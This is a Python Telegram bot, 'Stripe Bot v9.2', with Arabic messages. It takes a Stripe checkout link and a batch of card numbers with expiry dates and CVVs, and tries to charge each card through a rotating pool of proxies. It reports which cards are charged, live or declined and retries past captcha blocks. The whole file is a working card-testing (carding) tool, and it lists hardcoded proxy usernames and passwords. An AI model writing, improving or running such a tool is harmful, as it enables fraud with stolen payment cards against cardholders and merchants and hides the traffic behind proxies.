#!/usr/bin/env python3
import os, sys, json, re, time, random, threading, queue, asyncio
from datetime import datetime
from collections import defaultdict
import requests
from stripe_core import (
    StripeSession, extract_cs_pk, parse_card, log, C
)

try:
    import aiohttp
    from flask import Flask, jsonify
except ImportError:
    print("pip install aiohttp flask --break-system-packages"); sys.exit(1)

TG_TOKEN = ""
TG_ADMIN = 0
WORKING = []
_PI = 0
user_state = {}
user_lock = threading.Lock()

RAW_PROXIES = """
45.45.197.108:45551:2P6bMPAijshpBkX:Cp2qF3hkdStjjeI
168.228.46.189:12345:tickets:proxyon145
37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB
23.188.208.26:58008:MamunBoss:Update_Verizon
175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA
82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg
23.188.208.26:58049:MamunBoss:Update_Verizon
136.162.138.66:47139:TI8inwlBAtrSVBR:YAPM4Ae4gSyQxEX
138.94.218.193:12345:tickets:proxyon145
63.160.189.231:59521:matwilland:HgAWkDodeC
190.123.219.12:12345:tickets:proxyon145
us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY
154.9.131.106:45378:matwilland:T68DKKgz7c
190.60.16.28:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2
""".strip().splitlines()

MAX_CARD_RETRIES = 3
MAX_PARALLEL_CARDS = 2

def parse_proxy_full(l):
    l = l.strip()
    if not l or l.startswith('#'): return None
    p = l.split(':')
    if len(p) == 4:
        ip, port, user, pw = p
        return {"url": f"http://{ip}:{port}", "auth": (str(user), str(pw)), "raw": l}
    elif len(p) == 2:
        ip, port = p
        return {"url": f"http://{ip}:{port}", "auth": None, "raw": l}
    return None

def get_proxy():
    global _PI
    if not WORKING: return None
    _PI += 1
    return WORKING[_PI % len(WORKING)]

async def test_px(sess, entry):
    for test_url in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            kw = {"timeout": aiohttp.ClientTimeout(total=10), "proxy": entry["url"]}
            if entry["auth"]:
                kw["proxy_auth"] = aiohttp.BasicAuth(entry["auth"][0], entry["auth"][1])
            async with sess.get(test_url, **kw) as r:
                if r.status == 200:
                    t = await r.text()
                    if t.strip(): return entry
        except: continue
    return None

async def check_proxies():
    global WORKING
    if not RAW_PROXIES:
        log("No proxies", C.RED); return
    entries = [e for e in (parse_proxy_full(l) for l in RAW_PROXIES) if e]
    log(f"Testing {len(entries)} proxies...", C.GOLD)
    WORKING = []
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=20)) as s:
        for f in asyncio.as_completed([test_px(s, e) for e in entries]):
            r = await f
            if r: WORKING.append(r)
    log(f"Working: {len(WORKING)}/{len(entries)}", C.LIME if WORKING else C.RED)

_tq = queue.Queue()
_tg_sess = requests.Session()

def _tg_api(method, params):
    try:
        r = _tg_sess.post(f"https://api.telegram.org/bot{TG_TOKEN}/{method}", json=params, timeout=15)
        return r.json()
    except: return None

def _send(cid, text, rt=None):
    p = {"chat_id": cid, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if rt: p["reply_to_message_id"] = rt
    return _tg_api("sendMessage", p)

async def check_one_card(cid, mid, url, card, idx, total, sem, summary, summary_lock):
    async with sem:
        card_result = None
        attempts_used = 0
        waf_streak = 0
        
        for attempt in range(1, MAX_CARD_RETRIES + 1):
            attempts_used = attempt
            px_entry = get_proxy()
            px_show = px_entry["url"].replace("http://","") if px_entry else "no-proxy"
            log(f"Card {idx}/{total} attempt {attempt} via {px_show}", C.CYN)
            
            try:
                sess = StripeSession(url, proxy_entry=px_entry)
                ok, err = await sess.prefetch()
                if not ok:
                    await sess.close()
                    log(f"  prefetch: {err}", C.RED)
                    if "expired" in err.lower():
                        async with summary_lock:
                            summary["SESSION_EXPIRED"] += 1
                        _send(cid, f"⚠️ جلسة منتهية", rt=mid)
                        return
                    if attempt < MAX_CARD_RETRIES:
                        await asyncio.sleep(0.5)
                    continue
                
                r = await sess.charge(card)
                await sess.close()
                card_result = r
                st = r["status"]
                
                if st in ("CHARGED", "DECLINED", "LIVE", "SESSION_EXPIRED", "3DS_OTP", "ERROR"):
                    break
                
                if st == "CAPTCHA_FAIL":
                    waf_streak += 1
                    if waf_streak >= 2:
                        break
                    await asyncio.sleep(0.5)
                else:
                    waf_streak = 0
                    if attempt < MAX_CARD_RETRIES:
                        await asyncio.sleep(0.8)
            
            except Exception as e:
                log(f"  crash: {type(e).__name__}: {str(e)[:50]}", C.RED)
                await asyncio.sleep(0.5)
                continue
        
        if not card_result:
            async with summary_lock:
                summary["ERROR"] += 1
            _send(cid, f"⚠️ <b>بطاقة {idx}/{total}: فشلت</b>\n<code>{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}</code>", rt=mid)
            return
        
        st = card_result["status"]
        async with summary_lock:
            summary[st] = summary.get(st, 0) + 1
        
        icon = {"CHARGED":"✅","LIVE":"💚","3DS_OTP":"🔐","3DS":"🔐",
                "CAPTCHA_FAIL":"🤖","SESSION_EXPIRED":"⚠️","DECLINED":"❌","ERROR":"⚠️"}.get(st, "❌")
        body = (f"{icon} <b>[{idx}/{total}] {st}</b>\n"
                f"▸ Card: <code>{card_result['card']}</code>\n"
                f"▸ Amount: {card_result['amount']}\n")
        if card_result.get("variant"): body += f"▸ Variant: {card_result['variant']}\n"
        body += f"▸ Time: {card_result['response_time']:.1f}s\n"
        if card_result["message"]: body += f"▸ Msg: {card_result['message'][:120]}\n"
        _send(cid, body, rt=mid)

def process_task(cid, mid, url, cards):
    _send(cid, f"⏳ فحص <b>{len(cards)}</b> بطاقة — <b>{MAX_PARALLEL_CARDS}x parallel</b>\n▸ Proxies: {len(WORKING)}", rt=mid)
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    
    async def run():
        px0 = get_proxy()
        probe = StripeSession(url, proxy_entry=px0)
        try:
            ok, err = await probe.prefetch()
        except Exception as e:
            _send(cid, f"❌ Prefetch: {type(e).__name__}: {str(e)[:80]}", rt=mid)
            await probe.close(); return
        if not ok:
            _send(cid, f"❌ Prefetch: {err}", rt=mid)
            await probe.close(); return
        _send(cid, f"🛒 <b>{probe.merchant}</b> | {probe.amount_str}", rt=mid)
        await probe.close()
        
        summary = defaultdict(int)
        summary_lock = asyncio.Lock()
        sem = asyncio.Semaphore(MAX_PARALLEL_CARDS)
        
        tasks = [check_one_card(cid, mid, url, card, i+1, len(cards), sem, summary, summary_lock)
                 for i, card in enumerate(cards)]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        s = summary
        _send(cid, f"<b>📊 ملخص</b>\n━━━━━━━━━━━━━━━\n"
                  f"✅ CHARGED: <b>{s.get('CHARGED',0)}</b>\n"
                  f"💚 LIVE: <b>{s.get('LIVE',0)}</b>\n"
                  f"🔐 OTP: <b>{s.get('3DS_OTP',0)}</b>\n"
                  f"❌ DECLINED: <b>{s.get('DECLINED',0)}</b>\n"
                  f"🤖 CAPTCHA: <b>{s.get('CAPTCHA_FAIL',0)}</b>\n"
                  f"⚠️ ERROR: <b>{s.get('ERROR',0)}</b>\n"
                  f"━━━━━━━━━━━━━━━\n"
                  f"Total: {sum(s.values())}/{len(cards)}", rt=mid)
    
    try: loop.run_until_complete(run())
    except Exception as e:
        log(f"run() crash: {e}", C.RED)
        _send(cid, f"⚠️ crash: {str(e)[:100]}", rt=mid)
    finally: loop.close()

def _worker():
    while True:
        item = _tq.get()
        if item is None: continue
        cid, mid, url, cards = item
        try: process_task(cid, mid, url, cards)
        except Exception as e: _send(cid, f"⚠️ {str(e)[:80]}", rt=mid)
        finally: _tq.task_done()

def parse_cards_block(text):
    return [c for c in (parse_card(l) for l in text.splitlines()) if c]

def _poll():
    global TG_ADMIN
    off = 0
    log("Bot live! /start", C.LIME)
    while True:
        try:
            r = _tg_api("getUpdates", {"offset": off, "timeout": 30, "allowed_updates": ["message"]})
            if not r or not r.get("ok"): time.sleep(3); continue
            for u in r.get("result", []):
                off = u["update_id"] + 1
                m = u.get("message")
                if not m: continue
                cid = m["chat"]["id"]
                if cid != TG_ADMIN: continue
                txt = m.get("text", "").strip(); mid = m["message_id"]
                if txt in ("/start","/reset"):
                    with user_lock: user_state[cid] = {'step':'url','url':None}
                    _send(cid, "🔥 <b>Stripe Bot v9.2</b>\n📎 أرسل رابط Stripe:", rt=mid)
                    continue
                with user_lock: state = user_state.get(cid, {'step':'url','url':None})
                if state['step'] == 'url':
                    if not txt.startswith("http"):
                        _send(cid, "❌ رابط غير صالح.", rt=mid); continue
                    cs, pk, _ = extract_cs_pk(txt)
                    if not cs or not pk:
                        _send(cid, "❌ ما فيه cs_live/pk_live.", rt=mid); continue
                    with user_lock: user_state[cid] = {'step':'cards','url':txt}
                    _send(cid, f"✅ محفوظ: <code>{cs[:40]}...</code>\n📨 أرسل البطاقات:", rt=mid)
                    continue
                if state['step'] == 'cards':
                    cards = parse_cards_block(txt)
                    if not cards:
                        _send(cid, "❌ صيغة: <code>CC|MM|YY|CVV</code>", rt=mid); continue
                    url = state['url']
                    _tq.put((cid, mid, url, cards))
                    with user_lock: user_state[cid] = {'step':'url','url':None}
                    _send(cid, f"📥 <b>{len(cards)}</b> بطاقة — بدأ...", rt=mid)
                    continue
        except Exception as e:
            log(f"poll: {e}", C.RED); time.sleep(3)

app = Flask(__name__)
@app.route('/')
def home(): return jsonify({"status":"running","version":"9.2","proxies":len(WORKING)})
def run_flask(): app.run(host="0.0.0.0", port=8000, debug=False, use_reloader=False)

if __name__ == "__main__":
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{C.CYN}{C.B}═══ STRIPE BOT v9.2 ═══{C.R}\n")
    TG_TOKEN = input(f"{C.GOLD}▸ Bot Token:{C.R} ").strip()
    try: TG_ADMIN = int(input(f"{C.GOLD}▸ Admin ID:{C.R} ").strip())
    except ValueError: sys.exit("ID numeric")
    
    _tg_api("deleteWebhook", {"drop_pending_updates": False})
    me = _tg_api("getMe", {})
    if me and me.get("ok"): log(f"@{me['result']['username']}", C.LIME)
    
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try: loop.run_until_complete(check_proxies())
    finally: loop.close()
    
    threading.Thread(target=_worker, daemon=True).start()
    threading.Thread(target=_poll, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    log("جاهز! /start", C.LIME)
    while True: time.sleep(10)
